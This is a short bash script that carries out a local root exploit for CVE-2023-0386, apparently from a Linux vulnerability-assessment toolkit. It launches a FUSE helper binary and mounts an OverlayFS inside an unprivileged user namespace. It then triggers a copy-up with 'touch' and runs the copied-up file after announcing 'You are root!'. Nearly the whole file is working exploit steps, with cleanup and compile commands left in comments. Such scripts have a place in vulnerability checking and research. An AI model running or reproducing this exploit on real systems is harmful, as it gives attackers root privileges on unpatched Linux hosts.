#!/bin/bash

# umount /home/zzzp/LinuxCheck_re/Vulnerability-Assessment/kernel/cve/cve-2023-0386/fuse
# rm -rf ./kernel/cve/cve-2023-0386/overlay 
# rm -rf ./kernel/cve/cve-2023-0386/fuse 
# rm -rf ./kernel/cve/cve-2023-0386/upper
# rm -rf ./kernel/cve/cve-2023-0386/workdir

# mkdir fuse upper overlay workdir
# echo "[+] Create dir"
# gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
# echo "[+] Compile fuse.c"

./kernel/cve/cve-2023-0386/efuse ./kernel/cve/cve-2023-0386/fuse
echo "[+] Create fuse file system"
unshare -Urm /bin/sh << EOF
    mount -t overlay overlay -o lowerdir=./kernel/cve/cve-2023-0386/fuse,upperdir=./kernel/cve/cve-2023-0386/upper,workdir=./kernel/cve/cve-2023-0386/workdir ./kernel/cve/cve-2023-0386/overlay
    echo "[+] Create overlayFS"

    touch ./kernel/cve/cve-2023-0386/overlay/hello
    echo "[+] Copy Up"

    exit
EOF
echo "[+] You are root!"
./kernel/cve/cve-2023-0386/upper/hello
